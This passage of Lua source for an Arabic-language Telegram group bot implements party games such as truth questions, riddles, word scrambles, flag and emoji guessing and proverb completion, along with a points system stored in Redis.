  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
} 
return send(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
end
if text == "بوب" or text == "مشاهير" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
KlamSpeed = {"شوان","سام","ايد شيرين","جاستين","اريانا","سام سميث","ايد","جاستين","معزه","ميسي","صلاح","محمد صلاح","احمد عز","كريستيانو","كريستيانو رونالدو","رامز جلال","امير كراره","ويجز","بابلو","تامر حسني","ابيو","شيرين","نانسي عجرم","محمد رمضان","احمد حلمي","محمد هنيدي","حسن حسني","حماقي","احمد مكي"};
name = KlamSpeed[math.random(#KlamSpeed)]
Redis:set(darket.."mshaher"..msg.chat_id,name)
name = string.gsub(name,"شوان","https://t.me/HC6HH/8")
name = string.gsub(name,"سام","https://t.me/HC6HH/7")
name = string.gsub(name,"سام سميث","https://t.me/HC6HH/7")
name = string.gsub(name,"ايد شيرين","https://t.me/HC6HH/6")
name = string.gsub(name,"ايد","https://t.me/HC6HH/6")
name = string.gsub(name,"جاستين","https://t.me/HC6HH/4")
name = string.gsub(name,"جاستين بيبر","https://t.me/HC6HH/4")
name = string.gsub(name,"اريانا","https://t.me/HC6HH/5")
name = string.gsub(name,"ميسي","https://t.me/HC6HH/10")
name = string.gsub(name,"معزه","https://t.me/HC6HH/10")
name = string.gsub(name,"صلاح","https://t.me/HC6HH/9")
name = string.gsub(name,"محمد صلاح","https://t.me/HC6HH/9")
name = string.gsub(name,"احمد عز","https://t.me/HC6HH/12")
name = string.gsub(name,"كريم عبدالعزيز","https://t.me/HC6HH/11")
name = string.gsub(name,"كريستيانو رونالدو","https://t.me/HC6HH/13")
name = string.gsub(name,"كريستيانو","https://t.me/HC6HH/13")
name = string.gsub(name,"امير كراره","https://t.me/HC6HH/14")
name = string.gsub(name,"رامز جلال","https://t.me/HC6HH/15")
name = string.gsub(name,"ويجز","https://t.me/HC6HH/16")
name = string.gsub(name,"بابلو","https://t.me/HC6HH/17")
name = string.gsub(name,"ابيو","https://t.me/HC6HH/20")
name = string.gsub(name,"شيرين","https://t.me/HC6HH/21")
name = string.gsub(name,"نانسي عجرم","https://t.me/HC6HH/22")
name = string.gsub(name,"محمد رمضان","https://t.me/HC6HH/25")
name = string.gsub(name,"احمد حلمي","https://t.me/HC6HH/26")
name = string.gsub(name,"محمد هنيدي","https://t.me/HC6HH/27")
name = string.gsub(name,"حسن حسني","https://t.me/HC6HH/28")
name = string.gsub(name,"احمد مكي","https://t.me/HC6HH/29")
name = string.gsub(name,"تامر حسني","https://t.me/HC6HH/30")
name = string.gsub(name,"حماقي","https://t.me/HC6HH/31")
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&photo="..name.."&caption="..URL.escape("اسرع واحد يقول اسم هذا الفنان").."&reply_to_message_id="..(msg.id/2097152/0.5))
--return send(msg_chat_id,msg_id,"٠ اسرع واحد يرتبها ~ {"..name.."}","md",true)  
end
end
if text == "الاسرع" or text == "ترتيب" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
KlamSpeed = {"سحور","سياره","استقبال","قنفذ","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","قهوه","سفينه","داركت","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","لعبه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
Redis:set(darket.."Game:Monotonous"..msg.chat_id,name)
name = string.gsub(name,"سحور","س ر و ح")
name = string.gsub(name,"سياره","ه ر س ي ا")
name = string.gsub(name,"استقبال","ل ب ا ت ق س ا")
name = string.gsub(name,"قنفذ","ذ ق ن ف")
name = string.gsub(name,"ايفون","و ن ف ا")
name = string.gsub(name,"داركت","ر و ف ر ي")
name = string.gsub(name,"مطبخ","خ ب ط م")
name = string.gsub(name,"كرستيانو","س ت ا ن و ك ر ي")
name = string.gsub(name,"دجاجه","ج ج ا د ه")
name = string.gsub(name,"مدرسه","ه م د ر س")
name = string.gsub(name,"الوان","ن ا و ا ل")
name = string.gsub(name,"غرفه","غ ه ر ف")
name = string.gsub(name,"ثلاجه","ج ه ت ل ا")
name = string.gsub(name,"قهوه","ه ق ه و")
name = string.gsub(name,"سفينه","ه ن ف ي س")
name = string.gsub(name,"محطه","ه ط م ح")
name = string.gsub(name,"طياره","ر ا ط ي ه")
name = string.gsub(name,"رادار","ر ا ر ا د")
name = string.gsub(name,"منزل","ن ز م ل")
name = string.gsub(name,"مستشفى","ى ش س ف ت م")
name = string.gsub(name,"كهرباء","ر ب ك ه ا ء")
name = string.gsub(name,"تفاحه","ح ه ا ت ف")
name = string.gsub(name,"اخطبوط","ط ب و ا خ ط")
name = string.gsub(name,"سلمون","ن م و ل س")
name = string.gsub(name,"فرنسا","ن ف ر س ا")
name = string.gsub(name,"برتقاله","ر ت ق ب ا ه ل")
name = string.gsub(name,"تفاح","ح ف ا ت")
name = string.gsub(name,"مطرقه","ه ط م ر ق")
name = string.gsub(name,"مصر","ص م ر")
name = string.gsub(name,"لعبه","ع ل ه ب")
name = string.gsub(name,"شباك","ب ش ا ك")
name = string.gsub(name,"باص","ص ا ب")
name = string.gsub(name,"سمكه","ك س م ه")
name = string.gsub(name,"ذباب","ب ا ب ذ")
name = string.gsub(name,"تلفاز","ت ف ل ز ا")
name = string.gsub(name,"حاسوب","س ا ح و ب")
name = string.gsub(name,"انترنت","ا ت ن ن  ر ت")
name = string.gsub(name,"ساحه","ح ا ه س")
name = string.gsub(name,"جسر","ر ج س")
return send(msg_chat_id,msg_id,"٠ اسرع واحد يرتبها ~ {"..name.."}","md",true)  
end
end
if text == "خيروك" or text == "لو خيروك" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
local texting = {
"الو خيروك بين البقاء مدى الحياة مع أخيك أو البقاء مدى الحياة مع حبيبك من تختار؟",
"لو عرضوا عليك السفر لمدة 20 عام مع شخص واحد فقط من تختار؟",
"امن تحب أكثر والدك أم والدتك؟",
"الو خيروك بين إعطاء هدية باهظة الثمن لفرد من أفراد أسرتك من تختار؟",
"لو خيروك بين الذكاء أو الثراء ماذا تختار؟",
"لو خيروك بين الزواج من شخص تحبه أو شخص سيحقق لك جميع أحلامك من تختار؟",
"الو خيروك بين المكوث مدى الحياة مع صديقك المفضل أو مع حبيبك من تختار؟",
"الو خيروك بين الشهادة الجامعية أو السفر حول العالم؟",
"الو خيروك بين العيش في نيويورك أو في لندن أيهما تختار؟",
"لو خيروك بين العودة إلى الماضي أو الذهاب إلى المستقبل أيهما تختار؟",
"لو خيروك بين تمتع شريك حياتك بصفة من الأثنين الطيبة أو حسن التصرف أيهما تختار؟",
"لو خيروك بين الزواج من شخص في عمرك فقير أو شخص يكبرك بعشرين عام غني من تختار",
"لو خيروك بين قتلك بالسم أو قتلك بالمسدس ماذا تختار؟",
"لو خيروك بين إنقاذ والدك أو إنقاذ والدتك من تختار؟",
}
return send(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
end
if text == "صراحه" or text == "جرأه" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
local texting = {
"هل تعرضت لغدر في حياتك؟",
"هل تعرف عيوبك؟",
"هل أنت مُسامح أم لا تستطيع أن تُسامح؟",
"إذا قمت بالسفر إلى نُزهة خارج بلدك فمن هو الشخص الذي تُحب أن يُرافقك؟هل تتدخل إذا وجدت شخص يتعرض لحادثة سير أم تتركه وترحل؟",
"ما هو الشخص الذي لا تستطيع أن ترفض له أي طلب؟",
"إذا أعجبت بشخصٍ ما، كيف تُظهر له هذا الإعجاب أو ما هي الطريقة التي ستتبعها لتظهر إعجابك به؟",
"هل ترى نفسك مُتناقضً؟",
"ما هو الموقف الذي تعرضت فيه إلى الاحراج المُبرح؟",
"ما هو الموقف الذي جعلك تبكي أمام مجموعة من الناس رغمًا عنك؟",
"إذا جاء شريك حياتك وطلب الانفصال، فماذا يكون ردك وقته؟",
"إذا كان والد يعمل بعملٍ فقير هل تقبل به أو تستعر منه؟",
"ما الذي يجعلك تُصاب بالغضب الشديد؟",
"هإذا وجدت الشخص الذي أحببتهُ في يومٍ ما يمسك بطفله، هل هذا سيشعرك بالألم؟",
"علاقتك مع اهلك",
"ثلاثة أشياء تحبها"
}
return send(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
end
if text == "حزوره" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
name = Hzora[math.random(#Hzora)]
Redis:set(darket.."Game:Riddles"..msg.chat_id,name)
name = string.gsub(name,"الجرس","شيئ اذا لمسته صرخ ما هوه ؟")
name = string.gsub(name,"عقرب الساعه","اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟")
name = string.gsub(name,"السمك","ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟")
name = string.gsub(name,"المطر","شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟")
name = string.gsub(name,"5","ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ")
name = string.gsub(name,"الكتاب","ما الشيئ الذي له اوراق وليس له جذور ؟")
name = string.gsub(name,"البسمار","ما هو الشيئ الذي لا يمشي الا بالضرب ؟")
name = string.gsub(name,"7","عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ")
name = string.gsub(name,"الكعبه","ما هو الشيئ الموجود وسط مكة ؟")
name = string.gsub(name,"بيت الشعر","ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ")
name = string.gsub(name,"لهانه","وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ")
name = string.gsub(name,"انا","ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟")
name = string.gsub(name,"امي","اخت خالك وليست خالتك من تكون ؟ ")
name = string.gsub(name,"الابره","ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ")
name = string.gsub(name,"الساعه","ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟")
name = string.gsub(name,"22","كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ")
name = string.gsub(name,"غلط","ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ")
name = string.gsub(name,"كم الساعه","ما هو السؤال الذي تختلف اجابته دائما ؟")
name = string.gsub(name,"البيتنجان","جسم اسود وقلب ابيض وراس اخظر فما هو ؟")
name = string.gsub(name,"البيض","ماهو الشيئ الذي اسمه على لونه ؟")
name = string.gsub(name,"المرايه","ارى كل شيئ من دون عيون من اكون ؟ ")
name = string.gsub(name,"الضوء","ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟")
name = string.gsub(name,"الهواء","ما هو الشيئ الذي يسير امامك ولا تراه ؟")
name = string.gsub(name,"الضل","ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ")
name = string.gsub(name,"العمر","ما هو الشيء الذي كلما طال قصر ؟ ")
name = string.gsub(name,"القلم","ما هو الشيئ الذي يكتب ولا يقرأ ؟")
name = string.gsub(name,"المشط","له أسنان ولا يعض ما هو ؟ ")
name = string.gsub(name,"الحفره","ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟")
name = string.gsub(name,"البحر","ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟")
name = string.gsub(name,"الثلج","انا ابن الماء فان تركوني في الماء مت فمن انا ؟")
name = string.gsub(name,"الاسفنج","كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟")
name = string.gsub(name,"الصوت","اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟")
name = string.gsub(name,"بلم","حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ")
return send(msg_chat_id,msg_id,"٠ اسرع واحد يحل الحزوره ↓\n {"..name.."}","md",true)  
end
end

if text == "اعلام" or text == "اعلام ودول" or text == "اعلام و دول" or text == "دول" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
Redis:del(darket.."Set:Country"..msg.chat_id)
Country_Rand = {"مصر","العراق","السعوديه","المانيا","تونس","الجزائر","فلسطين","اليمن","المغرب","البحرين","فرنسا","سويسرا","تركيا","انجلترا","الولايات المتحده","كندا","الكويت","ليبيا","السودان","سوريا"}
name = Country_Rand[math.random(#Country_Rand)]
Redis:set(darket.."Game:Countrygof"..msg.chat_id,name)
name = string.gsub(name,"مصر","🇪🇬")
name = string.gsub(name,"العراق","🇮🇶")
name = string.gsub(name,"السعوديه","🇸🇦")
name = string.gsub(name,"المانيا","🇩🇪")
name = string.gsub(name,"تونس","🇹🇳")
name = string.gsub(name,"الجزائر","🇩🇿")
name = string.gsub(name,"فلسطين","🇵🇸")
name = string.gsub(name,"اليمن","🇾🇪")
name = string.gsub(name,"المغرب","🇲🇦")
name = string.gsub(name,"البحرين","🇧🇭")
name = string.gsub(name,"فرنسا","🇫🇷")
name = string.gsub(name,"سويسرا","🇨🇭")
name = string.gsub(name,"انجلترا","🇬🇧")
name = string.gsub(name,"تركيا","🇹🇷")
name = string.gsub(name,"الولايات المتحده","🇱🇷")
name = string.gsub(name,"كندا","🇨🇦")
name = string.gsub(name,"الكويت","🇰🇼")
name = string.gsub(name,"ليبيا","🇱🇾")
name = string.gsub(name,"السودان","🇸🇩")
name = string.gsub(name,"سوريا","🇸🇾")
return send(msg_chat_id,msg_id,"٠ اسرع واحد يرسل اسم الدولة ~ {"..name.."}","md",true)  
end
end

if text == "معاني" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
Redis:del(darket.."Set:Maany"..msg.chat_id)
Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
name = Maany_Rand[math.random(#Maany_Rand)]
Redis:set(darket.."Game:Meaningof"..msg.chat_id,name)
name = string.gsub(name,"قرد","🐒")
name = string.gsub(name,"دجاجه","🐔")
name = string.gsub(name,"بطريق","🐧")
name = string.gsub(name,"ضفدع","🐸")
name = string.gsub(name,"بومه","🦉")
name = string.gsub(name,"نحله","🐝")
name = string.gsub(name,"ديك","🐓")
name = string.gsub(name,"جمل","🐫")
name = string.gsub(name,"بقره","🐄")
name = string.gsub(name,"دولفين","🐬")
name = string.gsub(name,"تمساح","🐊")
name = string.gsub(name,"قرش","🦈")
name = string.gsub(name,"نمر","🐅")
name = string.gsub(name,"اخطبوط","🐙")
name = string.gsub(name,"سمكه","🐟")
name = string.gsub(name,"خفاش","🦇")
name = string.gsub(name,"اسد","🦁")
name = string.gsub(name,"فأر","🐭")
name = string.gsub(name,"ذئب","🐺")
name = string.gsub(name,"فراشه","🦋")
name = string.gsub(name,"عقرب","🦂")
name = string.gsub(name,"زرافه","🦒")
name = string.gsub(name,"قنفذ","🦔")
name = string.gsub(name,"تفاحه","🍎")
name = string.gsub(name,"باذنجان","🍆")
return send(msg_chat_id,msg_id,"٠ اسرع واحد يدز معنى السمايل ~ {"..name.."}","md",true)  
end
end
if text == "انجليزي" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
Redis:del(darket.."Set:enkliz"..msg.chat_id)
enkliz_Rand = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','مختلف','سدني','نقود','اعلم','ذئب','تمساح','ذكي',};
name = enkliz_Rand[math.random(#enkliz_Rand)]
Redis:set(darket.."Game:enkliz"..msg.chat_id,name)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'سدني','Sydney')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'مختلف','Different')
name = string.gsub(name,'ذكي','Intelligent')
return send(msg_chat_id,msg_id,"٠ اسرع واحد يترجم ~ {"..name.."}","md",true)  
end
end
if text == "العكس" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
Redis:del(darket.."Set:Aks"..msg.chat_id)
katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
name = katu[math.random(#katu)]
Redis:set(darket.."Game:Reflection"..msg.chat_id,name)
name = string.gsub(name,"باي","هلو")
name = string.gsub(name,"فهمت","مافهمت")
name = string.gsub(name,"موزين","زين")
name = string.gsub(name,"اسمعك","ماسمعك")
name = string.gsub(name,"احبك","ماحبك")
name = string.gsub(name,"موحلو","حلو")
name = string.gsub(name,"نضيف","وصخ")
name = string.gsub(name,"حاره","بارده")
name = string.gsub(name,"و","عالي")
name = string.gsub(name,"جوه","فوك")
name = string.gsub(name,"سريع","بطيء")
name = string.gsub(name,"ونسه","ضوجه")
name = string.gsub(name,"طويل","قزم")
name = string.gsub(name,"سمين","ضعيف")
name = string.gsub(name,"ضعيف","قوي")
name = string.gsub(name,"شريف","كواد")
name = string.gsub(name,"شجاع","جبان")
name = string.gsub(name,"رحت","اجيت")
name = string.gsub(name,"عدل","ميت")
name = string.gsub(name,"نشيط","كسول")
name = string.gsub(name,"شبعان","جوعان")
name = string.gsub(name,"موعطشان","عطشان")
name = string.gsub(name,"خوش ولد","موخوش ولد")
name = string.gsub(name,"اني","مطي")
name = string.gsub(name,"هادئ","عصبي")
return send(msg_chat_id,msg_id,"٠ اسرع واحد يدز العكس ~ {"..name.."}","md",true)  
end
end
if text == "بات" or text == "محيبس" then   
if Redis:get(darket.."Status:Games"..msg.chat_id) then 
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '𝟏 ٠ { 👊 }', data = '/Mahibes1'}, {text = '𝟐 ٠ { 👊 }', data = '/Mahibes2'}, 
},
{
{text = '𝟑 ٠ { 👊 }', data = '/Mahibes3'}, {text = '𝟒 ٠ { 👊 }', data = '/Mahibes4'}, 
},
{
{text = '𝟓 ٠ { 👊 }', data = '/Mahibes5'}, {text = '𝟔 ٠ { 👊 }', data = '/Mahibes6'}, 
},
}
}
return send(msg_chat_id,msg_id, [[*
٠ لعبة المحيبس هي لعبة الحظ 
٠ جرب حظك ويه البوت واتونس 
٠ كل ما عليك هوا الضغط على احدى العضمات في الازرار
*]],"md",false, false, false, false, reply_markup)
end
end
if text == "خمن" or text == "تخمين" then   
if Redis:get(darket.."Status:Games"..msg.chat_id) then
Num = math.random(1,20)
Redis:set(darket.."Game:Estimate"..msg.chat_id..msg.sender.user_id,Num)  
return send(msg_chat_id,msg_id,"\n٠ اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n".."٠ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n".."٠سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ ","md",true)  
end
end
if text == "المختلف" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍🔧","🧚‍♀","??‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
name = mktlf[math.random(#mktlf)]
Redis:set(darket.."Game:Difference"..msg.chat_id,name)
name = string.gsub(name,"😸","😹😹😹😹😹😹😹😹😸😹😹😹😹")
name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻👻👻👻")
name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊")
name = string.gsub(name,"🌑","🌚🌚🌚🌚🌚🌑🌚🌚🌚")
name = string.gsub(name,"🌚","🌑🌑🌑🌑🌑🌚🌑🌑🌑")
name = string.gsub(name,"⭐️","🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟")
name = string.gsub(name,"✨","💫💫💫💫💫✨💫💫💫💫")
name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨")
name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
name = string.gsub(name,"👨‍💻","👩‍💻👩‍??👩‍‍💻👩‍‍??👩‍‍💻👨‍💻??‍💻👩‍💻👩‍💻")
name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧")
name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳")
name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀")
name = string.gsub(name,"🧝‍♂","🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀")
name = string.gsub(name,"🙍‍♂️","🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️")
name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️??‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️")
name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
name = string.gsub(name,"👨‍👨‍👧","👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦")
name = string.gsub(name,"🕒","🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒")
name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
name = string.gsub(name,"📅","📆📆📆📆📆📆📅📆📆")
return send(msg_chat_id,msg_id,"٠ اسرع واحد يدز الاختلاف ~ {"..name.."}","md",true)  
end
end
if text == "امثله" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
mthal = {"زوج","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
name = mthal[math.random(#mthal)]
Redis:set(darket.."Game:Example"..msg.chat_id,name)
name = string.gsub(name,"زوج","ينطي____للماعده سنون")
name = string.gsub(name,"ضراطه","الي يسوق المطي يتحمل___")
name = string.gsub(name,"بيدك","اكل___محد يفيدك")
name = string.gsub(name,"الحافي","تجدي من___نعال")
name = string.gsub(name,"شقره","مع الخيل يا___")
name = string.gsub(name,"النخله","الطول طول___والعقل عقل الصخلة")
name = string.gsub(name,"سلايه","بالوجه امراية وبالظهر___")
name = string.gsub(name,"الخيل","من قلة___شدو على الچلاب سروج")
name = string.gsub(name,"حداد","موكل من صخم وجهه كال آني___")
name = string.gsub(name,"المبلل","___ما يخاف من المطر")
name = string.gsub(name,"الحبل","اللي تلدغة الحية يخاف من جرة___")
name = string.gsub(name,"يركص","المايعرف___يكول الكاع عوجه")
name = string.gsub(name,"العنب","المايلوح___يكول حامض")
name = string.gsub(name,"العمه","___إذا حبت الچنة ابليس يدخل الجنة")
name = string.gsub(name,"الخبز","انطي___للخباز حتى لو ياكل نصه")
name = string.gsub(name,"باحصاد","اسمة___ومنجله مكسور")
name = string.gsub(name,"شهر","امشي__ولا تعبر نهر")
name = string.gsub(name,"شكه","يامن تعب يامن__يا من على الحاضر لكة")
name = string.gsub(name,"القرد","__بعين امه غزال")
name = string.gsub(name,"يكحله","اجه___عماها")
return send(msg_chat_id,msg_id,"٠ اسرع واحد يكمل المثل ~ {"..name.."}","md",true)  
end
end
if text then
if text:match("^بيع نقاطي (%d+)$") then
local NumGame = text:match("^بيع نقاطي (%d+)$") 
if tonumber(NumGame) == tonumber(0) then
return send(msg_chat_id,msg_id,"\n*٠ لا استطيع البيع اقل من 1 *","md",true)  
end
local NumberGame = Redis:get(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id)
if tonumber(NumberGame) == tonumber(0) then
return send(msg_chat_id,msg_id,"٠ ليس لديك نقاط من الالعاب \n٠اذا كنت تريد ربح النقاط \n٠ ارسل الالعاب وابدأ اللعب ! ","md",true)  
end
if tonumber(NumGame) > tonumber(NumberGame) then
return send(msg_chat_id,msg_id,"\n٠ ليس لديك نقاط بهاذا العدد \n٠لزيادة نقاطك في اللعبه \n٠ ارسل الالعاب وابدأ اللعب !","md",true)   
end
local Xnxx = (tonumber(NumGame) * 50)
Redis:decrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id,NumGame)  
Redis:incrby(darket.."Num:Message:User"..msg.chat_id..":"..msg.sender.user_id,Xnxx )  
return send(msg_chat_id,msg_id,"٠ تم خصم *~ "..NumGame.." * من نقاطك \n٠وتم اضافة* ~  "..(NumGame * 50).."  رساله الى رسالك *","md",true)  
end 
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
